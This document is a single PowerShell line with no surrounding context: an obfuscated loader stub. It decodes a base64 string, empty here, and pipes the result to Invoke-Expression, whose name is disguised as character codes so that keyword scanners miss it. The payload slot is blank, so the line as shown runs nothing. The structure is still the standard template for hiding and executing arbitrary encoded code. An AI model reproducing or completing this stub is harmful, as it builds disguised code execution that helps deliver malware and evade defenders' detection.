$VWZO="";$FLR=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($VWZO));$FLR|&([char]73+[char]69+[char]120)